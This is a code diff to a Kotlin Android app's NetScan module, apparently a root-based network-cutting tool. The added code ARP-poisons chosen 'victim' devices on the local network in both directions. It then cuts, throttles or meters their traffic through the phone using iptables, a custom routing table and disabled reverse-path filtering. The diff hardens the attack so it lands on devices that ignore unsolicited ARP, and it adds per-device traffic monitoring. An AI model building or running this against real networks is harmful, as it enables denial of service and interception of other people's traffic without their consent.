@@ -70,6 +70,12 @@ object NetScan {
     @Volatile private var cutGwIp: String? = null
     @Volatile private var cutGwMac: String? = null
 
+    /** The value of /proc/sys/net/ipv4/ip_forward BEFORE we first touched it this
+     *  session, so a full teardown restores exactly what was there (bettercap does
+     *  this — issue #1261 — so e.g. an active hotspot's forwarding isn't left
+     *  broken). Null = we haven't changed it yet. */
+    @Volatile private var savedIpForward: String? = null
+
     /** Kills every running poisoner, however it was orphaned. Matches on BOTH
      *  /proc/<pid>/exe (the real binary path) AND /proc/<pid>/comm (the process
      *  name, "libarpcut.so") — never on the cmdline, because the issuing shell's
@@ -264,8 +270,20 @@ object NetScan {
      *  which is exactly the "network still slow after exit" failure. Safe anytime;
      *  touches only our own chain, routing rules, and ip_forward. */
     private fun teardownNetworking() {
-        runRoot(teardownScript())
+        // Wipe our rules/routes, then restore ip_forward to its pre-session value
+        // (default 0 if we never recorded one) — never leave forwarding stuck on.
+        val restore = "echo ${savedIpForward ?: "0"} > /proc/sys/net/ipv4/ip_forward 2>/dev/null"
+        runRoot(wipeRulesScript() + "\n" + restore)
+        savedIpForward = null
         shapingActive = false
+    }
+
+    /** Reads and remembers the original ip_forward value the first time we're
+     *  about to change it, so teardown can put it back exactly. */
+    private fun saveIpForwardOnce() {
+        if (savedIpForward != null) return
+        val v = runRoot("cat /proc/sys/net/ipv4/ip_forward 2>/dev/null").trim().firstOrNull()?.toString()
+        savedIpForward = if (v == "0" || v == "1") v else "0"
     }
 
     @Synchronized
@@ -282,81 +300,52 @@ object NetScan {
 
         // The ONE choke point every cut/throttle passes through. Defense in depth:
         // the UI already filters, but the core itself NEVER touches the gateway,
-        // this phone, a non-HOST, or a whitelisted device — no matter what it was
-        // handed. See eligibleTargets (pure + unit-tested).
+        // this phone, a non-HOST, or a whitelisted device. See eligibleTargets.
         val usable = eligibleTargets(limits, gwIpForGuard, myIp, whitelist)
+
+        // FULL RECONCILE — this is the fix for the sync/restore drift. Every change
+        // first returns the network to a CLEAN baseline: stop all poisoning,
+        // actively HEAL everyone we were poisoning (so anything removed from the
+        // set — a lifted cut OR throttle — genuinely recovers), and strip ALL our
+        // iptables/routing state. Only THEN do we re-establish exactly the desired
+        // set from scratch. Result: a device is never left half-cut, the desired
+        // set is always what's actually enforced, and the notification always
+        // matches. Devices that stay cut get a ~1 s heal-then-recut blip — a fair
+        // price for state that can't drift. This mirrors how bettercap fully
+        // un-spoofs on every stop rather than tracking partial diffs.
+        killPoisoners()
+        if (previous.isNotEmpty()) healTargets(previous)
+        lastTargets = emptyList()
+        teardownNetworking()
+
         if (usable.isEmpty()) {
-            // Nothing to cut now → restore everyone we were poisoning, then tear
-            // down forwarding. Heal BEFORE teardown so victims relearn the real
-            // gateway while forwarding is still up (no cut window).
-            killPoisoners()
-            healTargets(previous)
-            lastTargets = emptyList()
-            teardownNetworking()
             CutService.stop(context)
             return
         }
 
-        // We already resolved the gateway IP for the guard above; if even that
-        // failed there's no way to cut safely. Throwing here (before we touch the
-        // running cut) leaves the existing poisoner and rules exactly as they
-        // were — a failed apply never half-tears-down the current cut.
-        val gwIp = gwIpForGuard
-            ?: throw RuntimeException("gateway unknown")
+        // Re-establish from scratch. If the gateway is unknown we can't proceed —
+        // but everything is already healed/torn down, so the failure just leaves
+        // every device WORKING rather than stuck (a safe failure).
+        val gwIp = gwIpForGuard ?: run {
+            CutService.stop(context); throw RuntimeException("gateway unknown")
+        }
         val gwMac = lastGatewayMac
             ?: accumulated.values.firstOrNull { it.ip == gwIp }?.mac
             ?: cutGwMac
-            ?: throw RuntimeException("gateway MAC unknown — let the scan run first")
+            ?: run { CutService.stop(context); throw RuntimeException("gateway MAC unknown — let the scan run first") }
         cutGwIp = gwIp
         cutGwMac = gwMac
 
-        // Stop the old poisoner but DON'T heal yet — we're about to re-establish
-        // the set, and healing everyone here then re-poisoning would cause a blip.
-        killPoisoners()
-
-        // 1) ARP-poison every target so its traffic comes to this phone. The
-        //    poisoner is a detached root process, so we wrap it in a watchdog
-        //    that kills it the moment (a) our app process dies — force-stop,
-        //    crash, task-killer — or (b) the flag file is removed (a clean stop),
-        //    or (c) the poisoner itself exits. This guarantees the cut can never
-        //    keep running in the background once the app is gone.
-        val args = buildList {
-            add(toolPath(context)); add("cut"); add(lastIface)
-            add(gwIp); add(gwMac); add("0")
-            // Per target: "ip@mac@v" = cut (poison victim only, minimal footprint);
-            // "ip@mac@b" = throttle (poison both directions to shape the download).
-            usable.forEach { (d, kbps) ->
-                add("${d.ip}@${d.mac}@${poisonMode(kbps)}")
-            }
-        }
-        val shellLine = args.joinToString(" ") { "'" + it.replace("'", "'\\''") + "'" }
-        val appPid = android.os.Process.myPid()
-        val flag = (flagFile ?: java.io.File(context.filesDir, "cut.active")).also {
-            flagFile = it; runCatching { it.writeText("1") }
-        }.absolutePath
-        val guarded =
-            "$shellLine & CP=\$!; " +
-                "while kill -0 $appPid 2>/dev/null && [ -f '$flag' ] && kill -0 \$CP 2>/dev/null; do sleep 1; done; " +
-                "kill -9 \$CP 2>/dev/null"
+        // ARP-poison the desired set (full-duplex "@b" — poison victim AND gateway
+        // so the cut lands even on devices that ignore unsolicited ARP), then
+        // install its forwarding/netfilter rules.
         rlog("CUT ${usable.size} targets rates=${usable.map { it.second }}")
-        cutProc.set(ProcessBuilder("su", "-c", guarded).redirectErrorStream(true).start())
-
-        // 2) Install forwarding + our netfilter FORWARD sub-chain for every
-        //    listed target (blocks AND throttles). This uses NO tc/qdisc on
-        //    wlan0 — just plain forwarding + iptables drop rules, both measured
-        //    safe under load. Blocks get an explicit FORWARD DROP rather than
-        //    relying on ip_forward=0 (which is 1 by default on some devices, so
-        //    the old "just don't forward" cut silently failed to block there).
-        runRoot(policeScript(usable))
+        launchPoisoner(context, gwIp, gwMac,
+            usable.map { (d, kbps) -> "${d.ip}@${d.mac}@${poisonMode(kbps)}" })
+        saveIpForwardOnce()
+        runRoot(policeScript(usable, gwIp))
         shapingActive = true
-
-        // Heal any device that was poisoned before but is NOT in the new set, so
-        // it recovers immediately instead of staying cut until its ARP cache
-        // times out. Then record the current set as what's poisoned now.
-        val nowIps = usable.map { it.first.ip }.toSet()
-        healTargets(previous.filter { it.first !in nowIps })
         lastTargets = usable.map { it.first.ip to it.first.mac }
-
         CutService.update(context, usable.size)
     }
 
@@ -391,6 +380,121 @@ object NetScan {
             d.ip != gatewayIp &&
             d.ip != myIp &&
             d.mac.lowercase() !in whitelist
+    }
+
+    /** Launches the root poisoner for the given "ip@mac@mode" specs, wrapped in a
+     *  watchdog that kills it the instant our app process dies (force-stop, crash,
+     *  task-killer), the flag file is removed (a clean stop), or it exits itself —
+     *  so a poisoner can never outlive the app. Shared by cut/throttle and the
+     *  traffic meter. */
+    private fun launchPoisoner(context: Context, gwIp: String, gwMac: String, specs: List<String>) {
+        val args = buildList {
+            add(toolPath(context)); add("cut"); add(lastIface)
+            add(gwIp); add(gwMac); add("0")
+            addAll(specs)
+        }
+        val shellLine = args.joinToString(" ") { "'" + it.replace("'", "'\\''") + "'" }
+        val appPid = android.os.Process.myPid()
+        val flag = (flagFile ?: java.io.File(context.filesDir, "cut.active")).also {
+            flagFile = it; runCatching { it.writeText("1") }
+        }.absolutePath
+        val guarded =
+            "$shellLine & CP=\$!; " +
+                "while kill -0 $appPid 2>/dev/null && [ -f '$flag' ] && kill -0 \$CP 2>/dev/null; do sleep 1; done; " +
+                "kill -9 \$CP 2>/dev/null"
+        cutProc.set(ProcessBuilder("su", "-c", guarded).redirectErrorStream(true).start())
+    }
+
+    /** IP of the device currently being metered, or null. */
+    @Volatile private var monitoredIp: String? = null
+
+    /**
+     * Starts a per-device traffic meter: ARP-poisons [device] both directions,
+     * FORWARDS its traffic (so it keeps working — nothing is dropped) and counts
+     * up/down bytes via iptables. Mutually exclusive with a cut (it re-flushes the
+     * chain); the caller resumes cuts on stop. Returns false if the device isn't a
+     * real, non-self, non-gateway host or the gateway is unknown.
+     */
+    @Synchronized
+    fun startMonitor(context: Context, device: Device): Boolean {
+        val gwIp = lastGateway ?: cutGwIp ?: detectGateway(lastIface) ?: return false
+        val gwMac = lastGatewayMac
+            ?: accumulated.values.firstOrNull { it.ip == gwIp }?.mac
+            ?: cutGwMac ?: return false
+        if (device.kind != Device.Kind.HOST || device.mac.isBlank() || "." !in device.ip ||
+            device.ip == gwIp || device.ip == myIpv4(lastIface)
+        ) return false
+        cutGwIp = gwIp
+        cutGwMac = gwMac
+        // Full reconcile first (same as applyLimits): stop + HEAL whatever was
+        // poisoned (so paused cuts don't strand devices), wipe our rules, and drop
+        // the stale cut notification. Then stand up the meter cleanly.
+        val previous = lastTargets
+        killPoisoners()
+        if (previous.isNotEmpty()) healTargets(previous)
+        lastTargets = emptyList()
+        teardownNetworking()
+        CutService.stop(context)
+        // Poison both directions so we observe up AND down.
+        launchPoisoner(context, gwIp, gwMac, listOf("${device.ip}@${device.mac}@b"))
+        saveIpForwardOnce()
+        runRoot(monitorScript(device.ip, gwIp))
+        shapingActive = true
+        monitoredIp = device.ip
+        lastTargets = listOf(device.ip to device.mac)
+        rlog("MONITOR ${device.ip}")
+        return true
+    }
+
+    /** Forward the metered device's traffic (so it stays online) and count it. No
+     *  drops: `-d ip ACCEPT` tallies download bytes, `-s ip ACCEPT` upload bytes;
+     *  ACCEPT also bypasses Android's OEM forward chains. */
+    private fun monitorScript(ip: String, gwIp: String): String {
+        val sb = StringBuilder()
+        sb.append(forwardingSetup(gwIp))
+        sb.appendLine("iptables -N BETTERCUT 2>/dev/null")
+        sb.appendLine("iptables -F BETTERCUT")
+        sb.appendLine("iptables -C FORWARD -j BETTERCUT 2>/dev/null || iptables -I FORWARD -j BETTERCUT")
+        sb.appendLine("iptables -A BETTERCUT -d $ip -j ACCEPT")
+        sb.appendLine("iptables -A BETTERCUT -s $ip -j ACCEPT")
+        return sb.toString()
+    }
+
+    /** Cumulative [downBytes, upBytes] for the metered device from iptables byte
+     *  counters, or null if nothing is being metered. Poll and diff for a rate. */
+    fun readMeter(): LongArray? {
+        val ip = monitoredIp ?: return null
+        return parseMeter(runRoot("iptables -vnxL BETTERCUT 2>/dev/null"), ip)
+    }
+
+    /** Parses `iptables -vnxL BETTERCUT` output into [downBytes, upBytes] for [ip]:
+     *  the ACCEPT rule whose destination is the device counts download, whose
+     *  source is the device counts upload. Pure, so it's unit-tested. */
+    internal fun parseMeter(output: String, ip: String): LongArray {
+        var down = 0L
+        var up = 0L
+        for (line in output.lineSequence()) {
+            val f = line.trim().split(Regex("\\s+"))
+            // pkts bytes target prot opt in out source destination
+            if (f.size < 9 || f[2] != "ACCEPT") continue
+            val bytes = f[1].toLongOrNull() ?: continue
+            when (ip) {
+                f[8] -> down = bytes   // destination == device → download to it
+                f[7] -> up = bytes     // source == device → upload from it
+            }
+        }
+        return longArrayOf(down, up)
+    }
+
+    /** Stops the meter: kills the poisoner, heals ARP, tears down forwarding. */
+    @Synchronized
+    fun stopMonitor(context: Context) {
+        monitoredIp = null
+        killPoisoners()
+        healTargets(lastTargets)
+        lastTargets = emptyList()
+        teardownNetworking()
+        CutService.stop(context)
     }
 
     /** Kills every running poisoner and clears the run flag, WITHOUT healing —
@@ -429,13 +533,16 @@ object NetScan {
     fun cleanupNetworking() {
         runCatching { flagFile?.delete() }
         runCatching {
-            ProcessBuilder("su", "-c", "$KILL_POISONERS ; ${teardownScript()}")
+            ProcessBuilder("su", "-c", "$KILL_POISONERS ; ${wipeRulesScript()} ; echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
                 .redirectErrorStream(true).start().waitFor()
         }
         shapingActive = false
     }
 
-    private fun teardownScript(): String =
+    /** Removes ALL of our netfilter/routing footprint — the BETTERCUT chain, any
+     *  tc qdisc, our policy rules, and our route table — WITHOUT touching
+     *  ip_forward (callers decide that). */
+    private fun wipeRulesScript(): String =
         """
         iptables -F BETTERCUT 2>/dev/null
         iptables -D FORWARD -j BETTERCUT 2>/dev/null
@@ -444,8 +551,35 @@ object NetScan {
         tc qdisc del dev ifb0 root 2>/dev/null
         while ip rule del pref 17000 2>/dev/null; do : ; done
         while ip rule del pref 17001 2>/dev/null; do : ; done
-        echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
+        ip route flush table 17000 2>/dev/null
         """.trimIndent()
+
+    /**
+     * Shell to make this phone actually FORWARD poisoned traffic to the internet.
+     *
+     * We do NOT try to detect Android's per-network route table (the old
+     * `ip route get 8.8.8.8 | grep table` trick returned empty on this device, so
+     * the routing rule was never added and every forwarded packet was dropped —
+     * that's why the meter read 0 and throttle behaved like a cut). Instead we
+     * BUILD our own table 17000 from facts we already know for certain: a default
+     * route via the real gateway, plus the local /24, and send everything arriving
+     * on wlan0 through it. No parsing, no guessing.
+     */
+    private fun forwardingSetup(gwIp: String): String {
+        val subnet = myIpv4(lastIface)?.substringBeforeLast('.')?.let { "$it.0/24" }
+        val sb = StringBuilder()
+        sb.appendLine("echo 1 > /proc/sys/net/ipv4/ip_forward")
+        sb.appendLine("ip route flush table 17000 2>/dev/null")
+        if (subnet != null) sb.appendLine("ip route add $subnet dev $lastIface table 17000 2>/dev/null")
+        sb.appendLine("ip route add default via $gwIp dev $lastIface table 17000 2>/dev/null")
+        sb.appendLine("while ip rule del pref 17000 2>/dev/null; do : ; done")
+        sb.appendLine("ip rule add iif $lastIface lookup 17000 pref 17000 2>/dev/null")
+        // rp_filter would drop the victim traffic we forward (its source doesn't
+        // match our route back); relax it on the iface and globally.
+        sb.appendLine("echo 0 > /proc/sys/net/ipv4/conf/$lastIface/rp_filter 2>/dev/null")
+        sb.appendLine("echo 0 > /proc/sys/net/ipv4/conf/all/rp_filter 2>/dev/null")
+        return sb.toString()
+    }
 
     /**
      * Builds the root shell that forwards poisoned traffic and enforces limits,
@@ -461,37 +595,24 @@ object NetScan {
      * wlan0, so forwarding keeps working — the rate is jumpy (TCP reacts to drops)
      * but it actually throttles.
      */
-    private fun policeScript(targets: List<Pair<Device, Int>>): String {
-        val sb = StringBuilder()
-        // Only turn this phone into a router when something actually needs to
-        // TRANSIT it — i.e. a throttle (under-limit packets must be forwarded).
-        // A pure cut just drops the victim's uplink, so we leave ip_forward, the
-        // policy route, and rp_filter untouched. That keeps the phone off the
-        // forwarding path entirely and shrinks what the router sees us doing.
+    private fun policeScript(targets: List<Pair<Device, Int>>, gwIp: String): String {
         val hasThrottle = targets.any { it.second > 0 }
-        if (hasThrottle) {
-            // Forwarding on: lets under-limit throttled traffic transit the phone,
-            // and ensures the FORWARD chain (where our rules live) is traversed.
-            sb.appendLine("echo 1 > /proc/sys/net/ipv4/ip_forward")
-            // Android keeps the default route in a per-network table, not `main`, so
-            // forwarded (transit) packets find no route and get dropped. Route
-            // traffic arriving on the wifi iface via that table so it reaches the net.
-            sb.appendLine("TBL=\$(ip route get 8.8.8.8 2>/dev/null | grep -o 'table [^ ]*' | head -1 | cut -d' ' -f2)")
-            sb.appendLine("ip rule del pref 17000 2>/dev/null")
-            sb.appendLine("[ -n \"\$TBL\" ] && ip rule add iif $lastIface lookup \$TBL pref 17000 2>/dev/null")
-            // rp_filter would drop the victim traffic we forward; relax it.
-            sb.appendLine("echo 0 > /proc/sys/net/ipv4/conf/$lastIface/rp_filter 2>/dev/null")
-            sb.appendLine("echo 0 > /proc/sys/net/ipv4/conf/all/rp_filter 2>/dev/null")
-        } else {
-            // No throttles → the phone must NOT forward anything. Turn ip_forward
-            // OFF and drop any stale policy route from a previous mixed run, so a
-            // pure cut can never hairpin the LAN through this phone's radio (which
-            // saturates WiFi and slows the whole network, including this phone).
-            sb.appendLine("echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
-            sb.appendLine("while ip rule del pref 17000 2>/dev/null; do : ; done")
-        }
 
-        // One FORWARD sub-chain holds every block and throttle rule, run first.
+        // PURE CUT (no throttles) — bettercap "ban" model: the ARP spoof ALONE
+        // blocks the victim (its traffic comes to this phone and dies because
+        // forwarding is off). So we install NOTHING — no iptables chain, no policy
+        // route, no custom table. We only run teardownScript to (a) turn ip_forward
+        // OFF and (b) wipe any leftover chain/route/table from a previous
+        // throttle/meter session, so a cut leaves ZERO netfilter/routing state
+        // behind. This is the fix for "network still slow after restore": a cut no
+        // longer touches forwarding or iptables at all.
+        if (!hasThrottle) return wipeRulesScript() + "\necho 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null"
+
+        // THROTTLE / MIXED — needs the phone to forward under-limit packets, so it
+        // genuinely requires ip_forward + our routing table + the netfilter chain
+        // (cut victims in a mixed set get an explicit DROP since forwarding is on).
+        val sb = StringBuilder()
+        sb.append(forwardingSetup(gwIp))
         sb.appendLine("iptables -N BETTERCUT 2>/dev/null")
         sb.appendLine("iptables -F BETTERCUT")
         sb.appendLine("iptables -C FORWARD -j BETTERCUT 2>/dev/null || iptables -I FORWARD -j BETTERCUT")
@@ -503,9 +624,14 @@ object NetScan {
      *  is byte-mode, so kbit/s / 8 = kByte/s; never below 1. */
     internal fun kBytesPerSec(kbps: Int): Int = maxOf(1, kbps / 8)
 
-    /** Poison direction for a target: cut (kbps<=0) → "v" (victim only, minimal
-     *  footprint); throttle → "b" (both directions, to shape the download). */
-    internal fun poisonMode(kbps: Int): String = if (kbps <= 0) "v" else "b"
+    /** Poison direction — ALWAYS full-duplex ("b"): poison BOTH the victim and the
+     *  gateway. Victim-only ("v") was unreliable — many stacks (Windows, hardened
+     *  phones/IoT) ignore an unsolicited ARP reply, so a victim-only cut worked on
+     *  some devices and not others. Poisoning the gateway too means the victim's
+     *  INBOUND traffic is redirected to us regardless of whether the victim itself
+     *  accepts the poison, so the cut lands on both directions. (For a pure cut,
+     *  forwarding stays off, so both directions are simply dropped — no hairpin.) */
+    internal fun poisonMode(kbps: Int): String = "b"
 
     /** The per-target BETTERCUT rule lines for a set of (ip, kbps). Pure string
      *  building, split out so throttle/cut correctness is unit-testable without a
@@ -599,6 +725,26 @@ object NetScan {
         val gwIp = lastGateway ?: return
         val gwMac = lastGatewayMac ?: return
         runRoot("'$tool' heal '$lastIface' '$gwIp' '$gwMac'")
+    }
+
+    /** A live dump of the networking state behind cut/throttle/meter, so problems
+     *  can be diagnosed without ADB: forwarding flag, running poisoners, our route
+     *  table + rule, the BETTERCUT chain with byte counters, and the neighbour
+     *  (ARP) table showing whether targets are actually poisoned to this phone. */
+    fun diagnostics(): String {
+        val me = runCatching { myIpv4(lastIface) }.getOrNull() ?: "?"
+        val script = listOf(
+            "echo '=== iface $lastIface  self $me  gw ${lastGateway ?: cutGwIp ?: "?"} ==='",
+            "echo '--- ip_forward ---'; cat /proc/sys/net/ipv4/ip_forward 2>&1",
+            "echo '--- poisoners running ---'; " +
+                "for p in /proc/[0-9]*; do e=\$(readlink \$p/exe 2>/dev/null); " +
+                "case \"\$e\" in *libarpcut*) echo \"pid \${p##*/}: \$(cat \$p/cmdline 2>/dev/null | tr '\\0' ' ')\";; esac; done",
+            "echo '--- ip rule (pref 17000) ---'; ip rule show 2>&1 | grep -E '17000|lookup' ",
+            "echo '--- route table 17000 ---'; ip route show table 17000 2>&1",
+            "echo '--- BETTERCUT chain (bytes) ---'; iptables -vnxL BETTERCUT 2>&1",
+            "echo '--- ARP neigh ---'; ip neigh show dev $lastIface 2>&1",
+        ).joinToString(" ; ")
+        return runRoot(script).ifBlank { "(no output — is root granted?)" }
     }
 
     /** True if the app actually has working root (su granted). */
